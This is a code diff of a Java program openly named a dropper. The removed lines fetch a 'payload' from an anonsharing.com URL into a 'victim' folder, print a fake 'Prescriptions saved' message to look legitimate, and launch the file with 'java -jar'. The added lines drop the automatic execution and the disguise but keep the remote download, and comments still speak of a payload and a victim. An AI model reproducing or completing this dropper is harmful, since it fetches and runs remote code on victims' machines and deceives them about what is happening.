@@ -1,12 +1,10 @@
-// Java Dropper
-
 import java.io.*;
 import java.net.*;
 
 public class Dropper {
     public static void main(String[] args) {
-        String fileURL = "https://anonsharing.com/4c2236646a6fb2dc"; // Specify your URL for the payload
-        String saveDir = System.getProperty("/home/kali/"); // Specify the dir for victim, My case It's Kali
+        String fileURL = "https://anonsharing.com/cache/plugins/filepreviewer/47310/3add0bceed4257e3ca146742930f1f7bf8f90e0b09157a5b6cfe809414dcaf93/1100x800_cropped.jpg"; // Specify your URL for the payload
+        String saveDir = "/home/kali/Downloads"; // Specify the dir for the victim, in this case, it's Kali
 
         try {
             URL url = new URL(fileURL);
@@ -40,12 +38,14 @@ public class Dropper {
                 outputStream.close();
                 inputStream.close();
 
-                System.out.println("Prescriptions saved to: " + saveFilePath); // this is a dropper, so obviously you have to make it seem legit
+                System.out.println("File saved to: " + saveFilePath); // Provide feedback to the user
 
-                // IDK if this executes
-                Runtime.getRuntime().exec("java -jar " + saveFilePath);
+                // It's not recommended to execute the downloaded file automatically
+                // Instead, inform the user and let them decide whether to execute it
+                System.out.println("Please execute the downloaded file manually.");
+
             } else {
-                System.out.println("Sorry No medications for you. Server replied HTTP code: " + responseCode);
+                System.out.println("Sorry, file download failed. Server replied HTTP code: " + responseCode);
             }
             httpConn.disconnect();
         } catch (IOException e) {
